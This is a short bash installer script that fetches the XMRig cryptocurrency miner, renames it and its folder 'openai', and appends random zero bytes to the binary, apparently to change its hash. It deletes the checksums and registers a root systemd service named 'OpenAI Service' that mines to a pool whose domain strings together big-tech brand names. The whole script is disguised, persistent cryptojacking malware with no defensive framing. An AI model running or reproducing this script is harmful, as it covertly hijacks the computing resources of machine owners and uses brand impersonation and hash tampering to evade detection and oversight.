#!/bin/bash

U=$1
wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-static-x64.tar.gz 
tar -zxvf 1.tar.gz
mv xmrig-6.21.1 openai
mv openai/xmrig openai/openai
random_number=$RANDOM
rm -rf 1.tar.gz
cd openai && rm -rf SHA256SUMS
for i in $(seq 1 $random_number); do
  echo -n "0" >> /root/openai/openai
done

cat > /etc/systemd/system/openai.service <<EOL
[Unit]
Description=OpenAI Service
After=network.target

[Service]
Type=simple
ExecStart=/root/openai/openai -o us.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:1123 -u $1 -p $2 -a rx/0 -k 
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOL

systemctl daemon-reload
systemctl enable openai.service
systemctl start openai.service
